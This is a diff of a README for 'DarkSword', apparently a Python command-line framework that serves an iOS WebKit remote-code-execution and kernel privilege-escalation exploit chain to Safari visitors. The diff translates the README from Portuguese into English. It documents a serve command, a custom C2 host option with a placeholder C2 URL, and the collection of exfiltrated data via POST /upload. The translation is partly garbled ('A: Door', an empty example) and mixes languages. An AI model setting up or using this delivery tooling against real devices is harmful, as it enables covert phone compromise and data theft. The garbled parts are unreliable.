@@ -1,15 +1,15 @@
-# DarkSword Red Team Framework
+# DarkSword EN
 
-Framework Python com CLI para entrega da cadeia de exploits **DarkSword** em operações de red team. Baseado nos repositórios [DarkSword-RCE](https://github.com/htimesnine/DarkSword-RCE) e [darksword-kexploit](https://github.com/opa334/darksword-kexploit).
+Python framework with CLI for delivery of the **DarkSword** exploit chain. Based on the [DarkSword-RCE](https://github.com/htimesnine/DarkSword-RCE), [darksword-kexploit](https://github.com/opa334/darksword-kexploit) and [darksword](https://github.com/bhideki/darksword).
 
-> **Aviso**: Use apenas em ambientes autorizados. Operações de red team requerem autorização formal.
+> **Warning**: This repository is for educational purposes only.
 
-## Referências
+## References
 
 - [Google Threat Intelligence - DarkSword iOS Exploit Chain](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain)
-- Suporta iOS 18.4 - 18.7 (WebKit RCE + privilege escalation)
+- Currently iOS 18.4 - 18.7 (WebKit RCE + privilege escalation)
 
-## Instalação
+## Installation and Setup
 
 ```bash
 git clone https://github.com/bhideki/darksword.git
@@ -17,7 +17,7 @@ cd darksword
 pip install -e .
 ```
 
-## Uso Rápido
+## Quick Use
 
 ```bash
 darksword serve
@@ -27,9 +27,9 @@ Acesse de um dispositivo iOS (Safari): `http://<SEU_IP>:8080/`
 
 Payloads e kexploit ja incluidos. Para atualizar: `darksword sync` e `darksword sync-kexploit`
 
-## Comandos CLI
+## Client Commands
 
-| Comando | Descrição |
+| Command | Description |
 |---------|-----------|
 | `darksword serve` | Inicia servidor HTTP para entrega dos exploits |
 | `darksword sync` | Baixa payloads do repositório DarkSword-RCE |
@@ -39,16 +39,16 @@ Payloads e kexploit ja incluidos. Para atualizar: `darksword sync` e `darksword 
 | `darksword template list` | Lista templates disponíveis |
 | `darksword sync-kexploit` | Baixa kernel exploit (opa334, Objective-C) |
 
-### Opções do `serve`
+### `serve` Command
 
 ```
 darksword serve -H 0.0.0.0 -p 8080
 darksword serve -p 8443 --c2-host https://seu-c2.com/payload
 ```
 
-- `-H, --host`: Host (padrão: 0.0.0.0)
-- `-p, --port`: Porta (padrão: 8080)
-- `--c2-host`: C2 customizado (ex: `http://seu-ip:8080`) - sobrescreve host/porta no pe_main.js
+- `-H, --host`: Host (default: 0.0.0.0)
+- `-p, --port` A: Door (Default: 8080)
+- `--c2-host`: Custom C2 (ex: ) - overwrites host/port on pe_main.
 - `--redirect`: URL de redirecionamento em fallback
 
 Sem `--c2-host`, o host/porta sao obtidos do Host header (mesmo servidor). Dados exfiltrados vao para `exfil/` e POST `/upload`.
